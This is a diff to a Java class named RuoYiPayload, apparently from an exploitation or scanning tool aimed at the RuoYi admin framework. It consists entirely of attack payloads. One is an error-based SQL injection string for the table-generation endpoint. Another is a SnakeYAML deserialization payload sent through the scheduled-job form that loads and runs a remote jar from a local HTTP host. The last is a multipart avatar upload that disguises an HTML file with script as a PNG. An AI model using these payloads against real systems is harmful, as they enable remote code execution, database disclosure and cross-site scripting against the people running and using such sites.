@@ -12,7 +12,12 @@ public class RuoYiPayload {
 
     public static final String SQL_tool_gen_createTable = "sql=CREATE+table+ss1+as+SELECT%2F**%2F*+FROM+sys_job+WHERE+1%3D1+union%2F**%2FSELECT%2F**%2Fextractvalue(1%2Cconcat(0x7e%2C(select%2F**%2Fversion())%2C0x7e))%3B";
 
-    public static final String RCE_snakeyaml = "org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:8888/yaml-payload.jar\"]]]]')";
+    public static final String RCE_snakeyaml = "createBy=admin&jobName=1&jobGroup=DEFAULT&invokeTarget=org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager+%5B!!java.net.URLClassLoader+%5B%5B!!java.net.URL+%5B%22http%3A%2F%2F127.0.0.1%3A8888%2Fyaml-payload.jar%22%5D%5D%5D%5D')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=";
 
-    public static final String UPLOAD_system_user_profile_updateAvatar = "";
+    public static final String UPLOAD_system_user_profile_updateAvatar = "------WebKitFormBoundary8QopAWpBSNYnTHWH\n" +
+            "Content-Disposition: form-data; name=\"avatarfile\"; filename=\"blob.html\"\n" +
+            "Content-Type: image/png\n" +
+            "\n" +
+            "<script>alert(1)</script>\n" +
+            "------WebKitFormBoundary8QopAWpBSNYnTHWH--";
 }
